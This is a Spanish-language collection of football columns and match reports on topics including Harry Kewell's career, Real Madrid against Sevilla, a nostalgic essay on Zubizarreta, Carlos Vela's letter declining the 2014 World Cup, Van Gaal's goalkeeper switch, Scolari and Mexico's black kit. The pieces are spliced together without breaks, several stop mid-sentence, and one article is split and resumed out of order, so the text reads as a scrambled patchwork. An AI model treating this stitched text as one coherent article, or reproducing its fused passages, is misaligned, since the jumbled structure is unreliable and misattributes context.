pronóstico y en contra de la opinión mayoritaria de prensa y aficionados, Harry parecía levantar el vuelo como jugador red pese a que la grada de Anfield ya había dictado sentencia sobre él. Le acusaron, incluso, de haberse ‘borrado’ de aquel partido que se vio forzado a abandonar cuando su equipo aún perdía por un gol a cero.Sanluqueño-Teruel Terceros contra Terceros:Cerceda-LogroñésSariñena-Quintanar del ReyIzarra-NoveldaRacing B-Peña DeportivaEuropa-JerezReal Oviedo B-Arenas ClubEl Castillo-PalenciaMarino-San PedroAlcobendas Sport-Gerena Un bonito gol de Benzema selló la victoria del Real Madrid sobre un extramotivado Sevilla. El encuentro fue brusco, muy trabado en el centro del campo, con Lass, Khedira y Alonso secando la creación de Romaric y entorpeciendo las subidas de los casi inéditos Navas y Perrotti. El Sevilla, maniatado, se entregó al talento de Luis Fabiano y Kanouté, y casi consigue el primero igualar el partido tras superar a Casillas en el mano a mano. Sólo la agónica intervención de Albiol pudo evitar el tanto en la misma línea de portería. Yo lo vi dentro, el juez de línea no. El gol hubiera equilibrado la contienda, pero en la segunda parte, con el desnivel en el marcador, el equipo de Manzano se lanzó al ataque y ahí pudo sentenciar el Madrid de no ser por la falta de precisión de cara a puerta. Los contragolpes nunca fueron a buen puerto y Özil no fue incisivo cuando tuvo oportunidad. El orden y la contención fueron suficientes para tumbar a un Sevilla sin alternativas. Mourinho ha hecho de la disciplina táctica su virtud, hoy fue una victoria de la defensa, muy precisa en el achique e incansable en la marca. La excesiva dureza, incluyendo una feísima entrada de Lass a Sergio Sánchez, pueden enturbiar un partido con poca brillantez pero con muchísima intensidad. El agrio broche de la noche fue el botellazo de un aficionado a Casillas. Los recogepelotas escondieron el objeto y el portero intentó apaciguar los ánimos a pie de campo. Los ídolos hay que trabajárselos, no vale con esperarlos en el salón, hundidos en el sofá familiar, comiendo altramuces antes de la cena. Los ídolos de verdad no son como Cristiano Ronaldo, que llega sin pedírselo con terca epifanía. O Messi, que es vulgar en su divinidad. A los verdaderos ídolos hay que buscarlos en las cloacas y en las derrotas, en la desidia y el alcohol, hojeando las páginas pesadas de un álbum de cromos. El blanco engorda y el negro siempre sienta bien. En la vida, lo verdaderamente importante está en los rincones menos iluminados del fútbol, en las telarañas de las esquinas… en definitiva: en los noventa.Yo defendí a Zubizarreta en el patio escolar. Dije que me parecía el mejor portero de España. Moví los brazos de arriba abajo dibujando un globo perfecto y dije “España” con la boca llena de baba párvula. “No, yo seré Zubizarreta, que es el mejor portero de España” repetí cuando alguien me insistía en que me tocaba ser Paco Buyo. Yo era del Madrid, pero ahí ondeaba mi íntima rebeldía. No me dejé llevar por el escudo. Protoperiodista, de los serios, de boli y visera. No me gustaba Buyo. Era pequeño y saltarín. A mí Zubizarreta me daba seguridad paternal. Lo veía allí, bajo palos, tan grande, tan serio, tan a sus cosas. No se perdía en gritos al árbitro, ni palomiteaba –¡qué pronto vimos el artificio de las palomitas los niños futboleros! -, ni se abandonaba a duelos infantiles con los rivales. Zubizarreta era totémico, fiable y ganador. Como Jim Morrison, como Janis Joplin, este viejo rockero vitoriano siempre estaba magistralmente colocado. Imaginaba a Zubizarreta leyendo el periódico en el sofá de mi padre. Conduciendo nuestro Seat 127 color café. Diciéndole “guapa” a mi madre. Yo era su Electra. Veía el Barcelona a escondidas. Por ver cómo sacaba su manaza y desviaba con tibieza el balón a córner. Con esa parada suya que era hacia atrás, como dejándose caer sobre su espalda, como un viejo sentándose en la arena y diciendo “ay” por el sofoco y el dolor en los riñones. “Estoy en contra de la norma porque limita al portero. En el Barça utilizamos el pase al portero como arma ofensiva, no para perder tiempo. Me pasan el balón y yo saco largo o corto, pero es una forma de iniciar la jugada. Todavía no nos han prohibido nadie utilizar las manos en otras jugadas, que es lo que diferencia al portero de los demás jugadores” dijo Zubizarreta en el 92. Se cambiaba el paradigma. Los porteros no podían blocar el balón tras las cesiones de los compañeros. Se rompía el pacto narrativo. Andoni se adaptó a las nuevas exigencias, abandonó la sombra del larguero y dio sentido a lo que Cruyff planteaba. Acababa de ganar la Copa de Europa. Después de Zubi llegó la tierra baldía. A Eliot le hubieran faltado palabras para describir el paso de Busquets, Angoy, Rustü, Bonano, Arnau, Dutruel, Reina o Baia. Hasta Valdés -otro de mis ídolos-, la portería del Barcelona fue un carril de desaceleración, el WC de una gasolinera, una escombrera, un descampado, la boca de una alcantarilla.Quise su camiseta en el Mundial de USA 94, pero era demasiada cara. La Selección Española me permitía querer a Zubizarreta y olvidarme de mi club y el que él representaba. Era mi Yambut abierto a las tres de la mañana. Mi paraíso sentimental. El 1 a 1 contra Alemania fue el partido más importante de mi vida. Después vino lo de Nigeria, y fichar por el Valencia, y poco a poco nos fuimos alejando. Admiré a Cañizares como el esposo amantísimo que mira culpablemente el culo de la dependienta, como un traidor de pasillo, como un delegado de clase que se alinea con los profesores. La rebeldía dura lo que dura la adolescencia.Llegaron a decir que el australiano no merecía aquella medalla de campeón de Europa. Nunca conseguiría cambiar aquella imagen de jugador indolente y maniático. Disputando tan solo doce partidos ligueros en sus dos últimas temporadas como futbolista del Liverpool, Kewell abandonaría definitivamente Inglaterra en el verano de 2008, tras trece años repletos de altibajos. Su destino, Estambul.Ya con los treinta cumplidos, Harry Kewell firmó por el Galatasaray, en busca de una competición menos exigente con su ya muy maltrecho físico que la Premier League. Fueron tres años en los que los momentos brillantes se alternaron con las siempre inoportunas lesiones. Pero en Estambul no le iban a exigir mucho más. Con sus destellos y su experiencia en el más alto nivel, el exfutbolista de Leeds y Liverpool consiguió, al contrario de lo que le ocurrió en Inglaterra, ganarse a la hinchada Cim Bom.Con treinta y tres años, Europa se le hacía ya demasiado exigente a Kewell. Llegado el momento de volver a Australia, a la A-League. Primero a Melbourne Victory y más tarde al rival de la ciudad, el Heart, con un breve interludio de un mes en el Al-Gharafa catarí.Harry Kewell anunció hace un par de semanas que la actual sería su última campaña como futbolista en activo. Que, a sus treinta y seis años, su castigado cuerpo no aguantaba ya más el trote de la competición. ‘Empecé como profesional a los 17, y han sido 18 años de carrera profesional. Es una vida que ya he vivido, ahora quiero tener la oportunidad de poder vivir otra diferente‘. Puedes comprar camisetas de Harry Kewell, del mítico Leeds de finales de los noventa, o del Liverpool campeón de Europa, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Es año de Mundial y ya se percibe en el ambiente. Quien se ve con posibilidades de colarse en la lista de su país, busca minutos de juego como loco. Alguno incluso decide cambiar de aires en el mercado invernal, por encontrar un mayor protagonismo en su club de aquí a mayo, con la vista fijamente puesta en la cita brasileña del próximo verano. Todo sea por ganarse el favor del seleccionador de turno, por convencer de que uno de los puestos en la lista de veintitrés tiene hecha ya la reserva. Es un sentir más o menos extendido. Todos quieren entrar en la carrera por la lista mundialista. ¿Todos? Todos menos, al parecer, el mexicano Carlos Vela.Bajo la muy loable premisa de que sería injusto que él, que no ha participado en la complicadísima y conflictiva fase de clasificación del Tricolor, ocupase una plaza mundialista en el lugar de uno de sus compañeros, el delantero de la Real Sociedad ha anunciado, en una decisión consensuada con el cuerpo técnico azteca, que no será parte del combinado mexicano que acuda al campeonato brasileño. Y lo ha hecho precisamente cuando menos dudas existen de que es uno de los mejores jugadores del equipo dirigido por Miguel Herrera. Una decisión muy sorprendente porque Vela estaba llamado a ser, junto a Gio, Guardado o Chicharito una de las referencias del Tri en el Mundial, un escaparate inmejorable.Si hacemos caso de la versión ‘oficial’ ofrecida por el propio jugador, la decisión parece sensata y, sobre todo, honesta. Son otros los que han puesto la cara cuando las cosas han estado feas y son otros los que han logrado la clasificación en un ambiente muy enrarecido y tras una trayectoria complicada que necesitó incluso de una repesca ante Nueva Zelanda y son ellos los que merecen el ‘premio’ de estar en la cita brasileña. Pero si desea Vela lo mejor para el seleccionado mexicano, ¿por qué no ofrecerse, sabiendo que es uno de los puntales del equipo? ¿por qué permitir que México baje considerablemente su nivel con su ausencia?Tras su sorprendente renuncia subyace una sospecha de que ese ‘no estar mentalmente al cien por cien‘ tiene bastante que ver con el polémico episodio de Monterrey del año 2010, cuando la Federación mexicana filtró que varios jugadores del combinado azteca, entre los que se encontraba Vela, habían sido descubiertos en una fiesta clandestina que violaba el reglamento interno del seleccionado. El hoy jugador realista fue apartado seis meses del equipo nacional. Y hay quien piensa que todavía no ha conseguido digerir aquel escarnio. Para lamento del potencial mexicano.Carta íntegra de Carlos Vela explicando su renuncia al Mundial.3 de febrero de 2014. Quiero dirigir estas palabras que reflejan mi verdadero sentir una vez que tuve la reunión con el director técnico de la selección nacional de fútbol de nuestro país, el Señor Miguel Herrera. Tengo algunos puntos que es mi deseo compartir con todos aquellos que han dicho u opinado a este respecto.Mucho se ha dicho con respecto a mis decisiones de las invitaciones a formar parte del selecto grupo de compañeros de profesión y que representan a México.En cada reunión que he tenido con las distintas personas, que en su momento han sido los responsables directos de la selección, les he externado que mi país es México y que siempre lo será. Sin embargo, en este proceso que se ha ido desarrollando para la próxima justa mundialista, no he estado mentalmente al 100% para representar o formar parte de este representativo, el cual merece el máximo de mi respeto. Cuando lo haga, será porque en ese momento lo estaré, siempre y cuando, claro está, todavía exista el interés por parte del responsable de la propia selección para ser llamado.En esta decisión lo único que he sido es congruente con mis anteriores reuniones. De principio a fin.Encontré a otros ídolos, también rebuscando con un palo en los contenedores del fútbol. Otros porteros por los que paré en el patio, invocando su nombre, fantaseando con llevar sus camisetas. No hay número más pesado que el uno, cuando un portero elige el 13 es para evitar portar ese uno solitario y marmóreo en mitad de la espalda maltrecha. Siempre flirteé con el enemigo. Quise ser Kahn y Lamah, quise ser Zenga y Buffon. Zubizarreta se quedó escondido en el corazón, como las cositas importantes que ocupan los fondos de los armarios, como los libros que jamás volveremos a abrir pero que nos hicieron felices durante un tiempo. El francés no despega. Ha ido de menos a nada en lo que lleva vistiendo la camiseta del Madrid. Su fútbol es atropellado y poco asociativo y sus toscos detalles palidecen en un equipo dominado por el talento y plasticidad de jugadores como Cristiano Ronaldo, Di María u Özil. No creo que su poca participación en el equipo se deba exclusivamente al buen momento de Higuaín. Mourinho ha pedido públicamente un sacrificio mayor por parte del francés, un esfuerzo que lo aleje del gol y lo acerque a las zonas templadas del campo. Ataque y defensa, como el Eto´o estéril del Inter, más ocupado en impedir la creación del adversario que en meter el balón en sus redes. Por la cabeza de Benzema sobrevuela una idea que comparto: el mérito de los delanteros se mide con goles. Salir a correr, taponar y destruir no sirve para sacar brillo a un punta, a un jugador de vanguardia. El sistema termina engullendo a los jugadores.Los goles del Madrid no son patrimonio de un solo jugador. Así le fue bien al Barcelona de Guardiola desde que el de Santpedor cogió los trastos. La idea es crear un bloque con mucha fuerza sin el balón y con alternativas imprevisibles en el ataque. Higuaín ha sabido adaptarse magistralmente al esquema pretoriano de Mourinho, si bien el argentino nunca fue un delantero centro referencia. Es más, esa era la primera crítica que se le hacía cuando empezó tiernamente en el equipo blanco. Se le criticaba precisamente lo que ahora se le alaba, no era un nueve, caía mucho a banda y bajaba para subir el balón el mismo. La mezcla de tres jugadores con gol, pero no nueve puros, ha convencido al portugués. Di María, Cristiano e Higuaín no necesitan saberse delanteros para amenazar la portería contraria. La posición de Benzema es más clásica, mucho menos elástica, deudora de una tradición menos rígida en las obligaciones colectivas.Como punta de referencia, el agobio en la recuperación del balón y la cobertura defensiva es algo menos que una entelequia, es una desnaturalización del juego. Ya no basta con el instintivo movimiento de delantero que es escorarse para trazar una diagonal. Es la exigencia continua de rectificar la posición para destruir el juego del rival. Una tarea hercúlea para un jugador, además, con cierto aire bisoño, cándido e indolente. Unos rasgos que transmite sobre el césped, no es una cuestión de adaptación o pseudo psicología, su paso por el campo no transmite la urgencia y convencimiento de delanteros como Eto´o, por poner el ejemplo de un jugador que se tuvo que adaptar a un juego que no era precisamente el suyo.Difícil aventurar el futuro de Benzema en el Real Madrid. Desde luego, no es la que la ridícula y desagradable portada del Marca muestra hoy. Mourinho es un motivador, sí, pero también un ganador inflexible. La felicidad del francés es mucho menos importante que la felicidad de la parroquia madridista. Es una pieza sacrificable si sigue demostrando que no tiene la capacidad de adaptación que el sistema férreo le exige. Yo confío en las bondades del delantero desde que lo vi explotar en Lyon. El año pasado le pilló el tren con Pellegrini, pagó su inexperiencia, pero este año el problema es otro, y tiene difícil solución. La demorada explosión de Benzemá debe preocupar al Real Madrid, sólo son dos delanteros y la temporada será larga. ¿Será el delantero francés importante en este equipo? ¿Habrá segundas oportunidades? Hay pocas cosas más tontas que fallar un penalti. No se lleven a engaño. En un deporte donde se han marcado goles de chilena, desde el mediocampo, de falta directa a treinta metros y por la escuadra, para jugadores que han logrado anotar con el pecho, de rabona, en semicaída, con escorzos imposibles; eso de alojar la pelota desde los once metros sin más obstáculo que un minúsculo portero bajo no debería suponer ningún esfuerzo. Sin embargo sólo hay que echar un vistazo a nuestra historia futbolística para ver el disparate en forma de lanzamiento blando, artificio cómico, panenkada, ensayo rugbítico, que da por finalizada la esperanza. Olvídense de los méritos del portero, no aplaudan sus estiradas, si un guardameta para el balón es porque el lanzador lo ha hecho rematadamente mal. El penalti vulgariza a los grandes jugadores. Hasta los mejores aflojan los calzones cuando, en medio de la nada, el portero fija la mirada en el balón y reta al lanzador. Yo creo que los penaltis deberían desaparecer de este deporte, el motivo es obvio y no tiene nada que ver con la injusticia, la pena máxima -como su propio nombre indica- es un lance demasiado fácil para el juego. Me levanto pensando en la España que quiero. Hablo de la Selección, no del país.Cuando uno no se traiciona así mismo, tiene uno garantizado el éxito personal. Nunca me voy a traicionar y tampoco a las personas que creen en mí.No nos engañemos más. El proceso de eliminatoria para nuestra selección fue muy difícil y severamente criticado. Mis compañeros de profesión, los distintos cuerpos técnicos que la han formado, los mismos dirigentes de la Federación Mexicana, pasaron momentos muy complicados hasta el grado de recibir insultos.Todos mis compañeros que han pasado por esos momentos, quiero externarles mi más sincero respeto y admiración y a ellos principalmente están dirigidas estas palabras.Solamente irán 23 jugadores a Brasil. La gran mayoría o todos los que asistirán al Mundial serán muy afortunados. Algunos de estos 23 han vivido, gozado y sufrido esta calificación y no sería justo por mi parte el que alguno de ellos se quedara fuera para cederme su lugar.Hoy México está calificado para formar parte de las 32 selecciones mejores del mundo. No nos distraigamos en ver lo negativo y simplemente dediquémonos a apoyar con nuestro entusiasmo a la selección de México.Quiero agradecer a todos y cada uno de las personas que me han visitado o llamado. Desde Chepo de la Torre, Héctor González Iñarritu, Luis Fernando Tena, Victor Vucetich y ahora Miguel Herrera mostrando un interés por mí, pero éste es el momento de los convocados y elegidos por Miguel.Tal y como lo mencionó Miguel en su Twitter , punto final. Carlos Vela Volvía el Atleti a Lisboa. Volvían los colchoneros a Da Luz. Escenario maldito, diorama sobre el que se proyectaba la más dolorosa de las realidades y el más aciago de los recuerdos. Da Luz fue para la parroquia rojiblanca el descalabro imprevisto, el ‘en esa curva me maté yo‘ de la chica de la curva. Un lugar en el que un solo minuto, un triste e insignificante minuto, dio al traste con lo que hubiese supuesto la más brillante página del álbum de recuerdos del cholismo. Ese álbum al que inevitablemente tendrán que aferrarse los aficionados de la ribera del Manzanares cuando Simeone decida, más allá de 2020, que se le rompió el amor de tanto usarlo y de tanto abrazo loco y sin medida.Pero Da Luz se quedó en eso, en un recuerdo de los tristes, de los que solo el paso del tiempo consigue curar. Pasarán las temporadas y las generaciones venideras verán al estadio lisboeta como las actuales ven al desenfocado Schwarzenbeck. Una arcaica batallita sobre la que los abuelos edificarán historias inverosímiles que contar apasionados a sus colchonerísimos nietos. Porque las buenas historias se construyen sobre las derrotas y se dramatizan desde el dolor. Porque el cholismo no sería lo que es ni, sobre todo, lo que será dentro de varias décadas, sin el sabor agrio y metálico del guantazo de Sergio en aquel minuto noventa y tres.Cuesta comprenderlo porque el libro de aquella final aún tiene la tinta fresca. Será fácil de entender cuando las páginas empiecen ya a amarillear.Ayer el Atleti volvió a conducir por la carretera del imponente Da Luz. Volvió a recoger a esa chica pálida y desgarbada que inexplicablemente buscaba transporte en mitad de la noche. Volvió a revivir la pesadilla de hace año y medio. Pero esta vez no perdió el control de su coche en esa curva. No escuchó a su acompañante y firmó un partido serio, de los de dignísimo aspirante a todo, consiguiendo derrotar al Benfica (1-2) para firmar su solicitud a primer clasificado de grupo. La herida ya va cicatrizando. La pesadilla lisboeta empieza a tener su propia historia. ‘Cada jugador de mi selección tiene unas características determinadas y pensamos que Tim Krul era más adecuado para una tanda de penaltis que Jasper Cillessen; por su altura, podía llegar más fácilmente a las esquinas de la portería, como finalmente se pudo apreciar‘. Louis van Gaal explicaba así su sorprendente decisión de sustituir a su portero en el último minuto de la prórroga del partido de cuartos de final ante Costa Rica, un movimiento táctico que tuvo más de sorprendente por lo inhabitual que por lo razonable de su motivación. Del mismo modo que un técnico señalaría a su mejor lanzador de penaltis para lanzar una pena máxima durante el choque o seleccionaría a los cinco mejor preparados o dispuestos física y emocionalmente para patear una tanda, no debería de haber nada de extraño en que hiciese lo propio con aquel encargado de detenerlos.Van Gaal es un genio de la estrategia y así lo ha venido demostrando en no pocas ocasiones. Lo hizo en el duelo de octavos de final ante México, alterando la disposición táctica de los suyos para voltear en el tramo final un partido que se les había puesto muy cuesta arriba. Pero la decisión de dar entrada al meta del Newcastle tiene más de lógica aplastante, no exenta de una buena dosis de valentía y personalidad, que de genialidad táctica. Lo realmente meritorio es ser capaz de tenerlo todo tan aparentamente bajo control como para ser capaz de tomar una decisión así en un momento de tanta tensión. Con su paso adelante, el técnico neerlandés no solo reforzó su portería ante la prueba que se le venía encima, sino que creó una incertidumbre inesperada en el combinado costarricense. De la teórica superioridad en el enfrentamiento desde los once metros con Keylor bajo palos, a no estar del todo seguros de lo que se les venía encima.Krul se ajustó los guantes. Recibió apenas un par de balones lanzados con la mano a modo de testimonial calentamiento y se lanzó al escenario del área para convertirse en protagonista de la noche abrazado a la confianza que sobre él acababa de depositar van Gaal. El meta holandés interpretó a la perfección su papel de especialista. Convirtió, durante siete minutos, un deporte colectivo en una lucha individual.Pastillas para alérgicos por sofisticada publicidad. Todo. Pero al fin y al cabo, no se pueden pedir peras al olmo o buen gusto a un equipo fabril o una camiseta de fútbol digna a unos señores que se dedican a coser guantes.Y para completar los tres párrafos de rigor, un poco de historia. El Bayer Uerdingen, ahora KFC Uerdingen, es uno de esos deliciosos casos que nos hace hace creer en el sistema a la legión de aficionados al fútbol modesto. Radicado en un suburbio de la ciudad de Krefeld (los pajeros del metal la ubicaran por ser el hogar de los Blind Guardian) entre cadenas de montaje y las chimeneas químicas de la Bayer, el club supo escapar durante un instante de la inmundicia y asomarse al mundo real. Entonces y sólo entonces, durante la década de los ochenta fue alguien. El deceso llegó anticipadamente, en los primeros noventa, pero por el camino recogieron una Copa de Alemania en 1985 (frente al omnipresente Bayern Munich) el tercer puesto en la Bundesliga y una semifinal frente al Atlético de Madrid en aquella Recopa 86 que los colchoneros no pudieron levantar ante el Dinamo de Kiev. Al resto, me refiero sólo a los submarinistas del fútbol abisal, nos suena por cuestiones más intrincadas. Por ser el primer escudo alemán que besaron muy ilustres y noventeros arietes como Brian Laudrup, Stéphane Chapuisat u Oliver Bierhoff y por darle cobijo y abastecimiento en los estertores al grandísimo, en el sentido lato, Ailton. .El país se me ha ido ya de las manos. No tenemos Gobierno, como el vestuario del Madrid. Ojalá más benitofloros y menos pedrosáncheces, más leobeenhakkers y menos pabloiglesias. El combinado nacional solía ser el más barato y el que más dolor de cabeza traía. Los clubes se eligen, las Selecciones nos tocan. El Código Civil habla de la nacionalidad en su artículo 17. Ser de España es lo que hay. La camiseta blanca con el manchurrón de ketchup y mostaza, ese trapo del Desigual como metáfora: la camiseta manchada tras el Mundial de Brasil, el nombre mancillado, la estrella diluida entre geométricos truños.El fútbol es terapéutico, como el vino. Los dos partidos de preparación de cara a la Eurocopa han creado un sentimiento insoportable: la anodinia. Vicente del Bosque parece un árbol milenario: envejecido, inexpresivo y estático. No digo que no sea noble, digo que rezuma tristeza. Son tristes las presencias de Pedro o Casillas, por ejemplo. Como quien lleva una foto de su madre muerta en la cartera para acordarse de ella cada vez que echa gasolina o paga por un café. Del Bosque parece tener un pie aún en esa Selección que ganó Eurocopa-Mundial-Eurocopa hace ya cuatro años. La última gran prueba, la Copa del Mundo de Brasil, fue un batacazo a la altura de “Se va el chaval se va por la barranquilla”. Y Casillas, Pedro o incluso Cesc dan una sensación de pasado no superado que espanta.Los cambios generacionales se deben hacer con mesura, pero la mesura no puede ser tanta que parezca que no hay cambios. Sobre todo cuando lo nuevo no brilla. Alcácer no emociona, ni Thiago está para asumir galones, ni Nolito, Morata o Mario han aportado aún todo lo que tienen en sus botas.Puede que no seas más que un tirado de un suburbio al norte de Londres animando a un equipo penoso. Los chavales no ayudan. Se arrastran por la cuarta división y aun así deben dar gracias porque seguramente es lo máximo a lo que pueden aspirar. Tu campo es el más pequeño de la ciudad y uno de los más modestos de la categoría. Se llama Underhill, aunque bien podría denominarse underdog porque esa es la imagen que te devuelve el espejo cada vez que llegas a casa tras el partido, la de un perdedor. Para colmo, la camiseta del equipo tampoco es para sentirse orgulloso. Es ámbar y negra y se parece a la del Peñarol dicen los más optimistas. ¡Y un carajo, es horrible! . Hace frío en la grada y el cemento hiela tus pies. Vas a irte a casa. Pero de repente, Danny empieza con lo suyo. ¡Shake it up baby! . Ahí están de nuevo los cuatro fantásticos y tú, una abeja, mueves el culo de la silla y gritas que eres del Barnet. Al menos eres algo Dos milagros son demasiados en una semana. Incluso para un mundo tan dado a los prodigios raros como el que orbita alrededor de Silvio Berlusconi. Resucitado el viejo líder por arte y magia de la intrincada política italiana, faltaba que resucitara el equipo y a punto estuvieron de hacerlo. La grada contempló 45 minutos de transmutación dignos de que Mariló Montero desempolve la bata de investigadora inmediatamente. No hubo panes y peces pero casi y el casi en San Siro es un hito en los tiempos que corren. Superado el arranque rojiblanco, el Milan se miró la camiseta y descubrió que tenía siete estrellas. Ahí comenzó a buscar la portería de Courtois con ganas. El equipo inválido, el de la defensa espantosa y la construcción oxidada apretó de lo lindo al Atlético e incluso pudo mandarlo a la lona con dos puñetazos nítidos de Kaká y Poli. No hubo hombre al suelo porque Courtois es un fuera de serie. Su mano a Poli es digna de la mejor foto.Volviendo al Milan, lo suyo nada tuvo que ver con las miserias ligueras. Como preludio del carnaval, algunos rojinegros jugaron a disfrazarse. De Jong, un futbolista con más currículo que el zurriagazo a Xabi Alonso, aprovechó la torpeza atlética de flotarle para distribuir con acierto. Tanto que por un momento (leve) la grada dejo de maldecir la baja de Montolivo para reconocerle el trabajo con aplausos. Taarabt abandonó su versión chupona para volverse concreto y con su baile por la banda derecha tejió las dos ocasiones más claras y un traje para Insúa. Kaka fue el Kaka de este año, Balotelli se movía y participaba… Walking dead en San Siro.Hasta que apareció Simeone para descifrar el partido y resolverlo con maniobras precisas. Fue tras el descanso. De primeras, los visitantes fruncieron el ceño en defensa, principalmente Godín, y asfixiaron el ánimo milanista; en segundo lugar fue el Cholo el que acabó de romper el encuentro dando entrada al Cebolla Rodríguez y Adrián. La jugada le sirvió al Atlético para colonizar el centro del campo y tapar las subidas por la derecha del impetuoso Abate. Para incautar la poca munición que le quedaba al Milan. En el cambio Balotelli-Pazzini murieron un poco más los italianos, destapándose como el desastre estructural que son. El Atlético dominó a placer el último tramo y supo aprovechar el enésimo desbarajuste defensivo de los italianos, un mal despeje de Abate, para dejar la eliminatoria encarrilada con un cabezazo voraz de Diego Costa.Aunque reste el viaje a Madrid, la derrota suena a triste despedida para el equipo de Seedorf. Apesta a desfilar hacia la puerta, borracho y derrotado, con la sensación de que esa noche podrías haber mojado, pero no lo has hecho como tantas otras noches atrás en esta racha eterna. Lo peor es que no alcanzas a entender muy bien por qué sucede, con lo guapo que tú eras y lo a huevo que se te había puesto. Tuviste tu momento hace un ratito, con el dulcísimo momento que antecede a la cogorza ingobernable pero lo dejaste escapar. Así anda el Milan ahora. Con la camisa desabrochada y los bajos fuera del pantalón mientras trastabilla penosamente hacia alguna parte. Costa de Marfil, quizá la principal candidata a dar el salto que se espera del fútbol africano desde hace décadas, ha sufrido un duro revés a falta de un suspiro para el comienzo del Mundial. Didier Drogba, primerísimo espada del combinado nacional, ha sufrido una lesión en su brazo derecho mientras participaba en el partido amistoso de preparación contra Japón en Suiza. Con apenas un cuarto de hora de juego en el reloj, Tulio Tanaka, el japonés nacido en Sao Paulo que se desenvuelve como central en el equipo nipón, golpeó fortuitamente a Drogba provocándole una fractura de cúbito. Tras el examen médico, el  propio jugador confirmó que  no participará en la próxima Copa del Mundo. Uno de los mejores jugadores africanos de la historia se une así a la lista de ilustres ausentes en un campeonato mundial. Los bares son buenos sitios para aprender, te enseñan hasta las paredes. “Hoy es un buen día, seguro que viene alguien y lo jode”, reza el clásico azulejo español del que me he acordado mientras leía las declaraciones del alcalde de Verona. Flavio Tosi, que además es vicesecretario de la Liga Norte ha dedicado la previa del partido contra el Milan, con el que el mítico Hellas volverá a la Serie A tras una década en el infrafútbol, a ofrecerle consejos de vida a Mario Balotelli. Y de paso a toda la nación que aspira a liderar desde su púlpito de centroderecha. Dijo esto cuando le preguntaron por la posibilidad, nada remota, de que haya cánticos racistas en la grada del estadio Bentegodi. “Jugadores de color hay muchos y el que no suscita la ira de las aficiones rivales no tiene problemas. Balotelli es bueno en ser antipático”Tosi, que anda enfrascado en su carrera por suceder a Umberto Bossi y a Roberto Maroni al frente de la derecha italiana más recalcitrante, respondió así a unas declaraciones del delantero en ‘Sports Illustrated’ sobre el problema racista en la grada italiana. A Balotelli le preguntaron si esperaba coros racistas en Verona, plaza fuerte del pensamiento leguista, y vino a decir que si le insultaban lo único que podía hacer era marcar goles.Él contra Borges. Contra Bryan Ruiz. Contra Bolaños. Contra Giancarlo González. Y, por último, contra Umaña. Para terminar una tanda como se debe de terminar. Atajando el último penalti lanzado, explotando de felicidad y esperando la llegada en avalancha de todos los compañeros, liberados por fin de la congoja que siempre genera esta suerte. Siempre con la extrema lucidez futbolística de Louis van Gaal como telón de fondo. Luiz Felipe Scolari tiene miedo. Es más, tiene pánico. Está agarrotado por el temor a un fracaso que ha comenzado a percibir más cercano y plausible de lo que inicialmente podía prever. El partido de octavos de final ante Chile fue algo más que un simple toque de atención a las elevadísimas expectativas y aspiraciones brasileñas. Durante 120 minutos, Brasil se tambaleó en el alambre y jugó bajo una presión insoportable, consciente de manera real por primera vez desde que le fuese adjudicada la organización del presente Campeonato del Mundo de que la posibilidad del fracaso estaba ahí presente. Cuando el chileno Marcelo Pinilla reventó la pelota contra el larguero de Julio César, instantes antes del final de los treinta minutos de prórroga en el partido del pasado sábado, Felipão tomó la decisión de recrudecer la fiereza de su táctica.Empeñado en girarle le cara a la pelota, en una actitud que debería de sonrojar al mismísimo Cristo Redentor del Corcovado, el técnico brasileño tiene ya decidido y asumido hacia dónde dirigir las responsabilidades ante un supuesto fracaso de su equipo. Scolari no hablará de táctica ni de planteamientos. Ni siquiera debatirá sobre si debió de darle más minutos a Bernard y Willian o cambiar la disposición de la canarinha sobre el césped ante la inoperancia de sus puntas. El fútbol, para Scolari, está de más.Como los malos estudiantes, el técnico brasileño tiene una batería de excusas, a cada cual más peregrina, preparadas para por si acaso. Sabe que el país entero se le vendrá encima si Brasil consuma definitivamente su fracaso en su Mundial y es tal la presión bajo la que se maneja su grupo que conviene tener las defensas preparadas ante lo que se podría avecinar. Es el cuento de los irresponsables, de los que siempre ven manos negras, confabulaciones, astros caprichosamente alineados y al mundo contra ellos mismos. Scolari es un cobarde. Una persona que huye del compromiso y la responsabilidad, que se ve a sí mismo incapaz de dar respuestas coherentes ante la derrota. Su facilidad para dirigir los focos hacia los árbitros (‘Estoy siendo demasiado educado y los árbitros están reticentes con Brasil‘), la FIFA y todo el que se meta por delante, choca de manera radical con la dificultad que está teniendo su equipo para crear fútbol y controlar sus partidos. Tan hábil para unos cosas y tan negado para otras.Mal hace Scolari en subir las atmósferas de presión en el entorno de su equipo. La inestabilidad emocional exhibida hasta ahora por su plantel denota un nerviosismo irresistible en el seno de la verde-amarela y flaco favor le hace al grupo la actitud de su jefe. Brasil se ha autoimpuesto unas condiciones de tensión y presión que no está sabiendo gestionar como debiera. La imagen del capitán Thiago Silva refugiado en sí mismo durante la tanda de penaltis ante Chile y aparentemente ajeno a lo que se estaba dirimiendo sobre el verde es la muestra evidente de que este equipo está siendo sometido a una carga emocional insuperable. La angustia y el miedo mantienen el clima idóneo para que de la más mínima chispa se desate el más voraz y dramático de los incendios. Si el fuego termina propagándose y llevándose por delante todo lo que encuentre a su paso, Scolari ya estará a muchos kilómetros de distancia, resguardado, meneando el bigote y observando desde la lejanía la desdicha de aquellos a los que él dejó tirados por el camino. En su línea reciente de asesinar tradiciones futbolísticas de forma alevosa y premeditada, Adidas ha perpetrado otro de sus golpes de efecto con México como escenario (y víctima) de la fechoría. Semanas atrás era presentada la nueva equipación de la selección mexicana de fútbol que participará, junto a Jamaica, como país invitado en la próxima edición de la Copa América a disputar en Chile durante el mes de junio y, siguiendo la senda de la innovación más radical que ya iniciase con algunas de las equipaciones mundialistas del pasado año, la casa deportiva alemana, en connivencia con la federación azteca, ha decidido apostar por una maniobra de marketing que atenta directamente contra la tradición futbolística mexicana. Porque México vestirá el negro como color principal durante el torneo americano del próximo verano, repudiando el tradicional verde de sus equipaciones (empleado desde la década de los años cincuenta en sustitución del primigenio color guinda con el que comenzó a disputar sus partidos el combinado mexicano) y pisoteando más de sesenta años de historia ligada al color verde. Bajo el lema #Elverdesellevaenelcorazón, Adidas ha camuflado una estrategia comercial (hay que recordar que la camiseta alternativa de color negro empleada en el Mundial de 2010 fue un auténtico éxito de ventas) que no ha sentado nada bien entre la afición azteca. Porque la camiseta verde, que tenía que seguir siendo verde, ya no es verde. Porque un capricho empresarial surgido de la cabeza pensante de cualquier responsable de marketing enclaustrado en un despacho ha caído como un escupitajo sobre la opinión de una afición 